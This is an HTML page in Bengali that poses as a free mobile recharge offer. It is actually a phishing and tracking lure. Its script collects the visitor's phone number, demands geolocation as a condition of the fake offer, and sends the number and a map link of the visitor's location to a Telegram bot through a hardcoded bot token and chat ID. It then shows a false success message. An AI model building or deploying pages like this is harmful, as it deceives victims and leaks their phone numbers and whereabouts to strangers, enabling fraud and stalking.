<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #f4f4f4; font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        .container { background: white; max-width: 400px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .offer { color: #28a745; font-size: 24px; font-weight: bold; }
        input { width: 100%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        button { background: #007bff; color: white; padding: 12px; width: 100%; border: none; border-radius: 8px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="offer">২০ টাকা ফ্রি রিচার্জ! 🎁</div>
        <p>নম্বর দিয়ে নিচের বাটনে ক্লিক করুন</p>
        <input type="number" id="phone" placeholder="017XXXXXXXX">
        <button onclick="sendInfo()">উইথড্র (Withdraw)</button>
    </div>

    <script>
        async function sendInfo() {
            const phone = document.getElementById('phone').value;
            const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; // আপনার টোকেন
            const chat_id = "7887080882"; // আপনার আইডি

            if (phone.length < 11) { alert("সঠিক নম্বর দিন"); return; }

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const map = `https://www.google.com/maps?q=${lat},${lon}`;
                const text = `🔔 নতুন রিচার্জ!\n📱 নম্বর: ${phone}\n📍 ম্যাপ: ${map}`;
                
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
                alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
            }, () => {
                alert("লোকেশন পারমিশন ছাড়া অফারটি প্রযোজ্য নয়।");
            });
        }
    </script>
</body>
</html>
